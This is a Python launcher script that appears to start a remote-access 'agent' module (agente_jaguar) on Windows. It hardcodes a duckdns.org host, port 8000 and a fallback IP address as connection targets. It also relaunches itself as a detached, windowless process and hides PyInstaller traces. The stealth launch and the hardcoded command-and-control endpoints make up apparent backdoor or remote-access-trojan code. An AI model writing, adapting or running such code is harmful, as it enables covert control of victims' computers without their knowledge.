import os, sys, subprocess
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
_HOST = 'jaguarxxx.duckdns.org'
_PORT = '8000'
_HOST2 = '46.246.12.18'
os.environ.setdefault('JAGUAR_HOST', _HOST)
os.environ.setdefault('JAGUAR_PORT', _PORT)
os.environ.setdefault('JAGUAR_HOST2', _HOST2)
DETACHED_PROCESS = 0x00000008
CREATE_NEW_PROCESS_GROUP = 0x00000200
CREATE_NO_WINDOW = 0x08000000
def _entorno_limpio():
    env = os.environ.copy()
    for _k in list(env):
        if _k.startswith('_PYI_') or _k in ('_MEIPASS', '_MEIPASS2'):
            env.pop(_k, None)
    env['PYINSTALLER_RESET_ENVIRONMENT'] = '1'
    return env
if sys.platform.startswith('win') and '--jaguar-detached' not in sys.argv:
    subprocess.Popen(
        [sys.executable, '--jaguar-detached', _HOST, _PORT],
        env=_entorno_limpio(),
        creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW,
        close_fds=True)
    sys.exit(0)
sys.argv = [sys.argv[0], _HOST, _PORT, _HOST2]
import agente_jaguar as agente
agente.main()
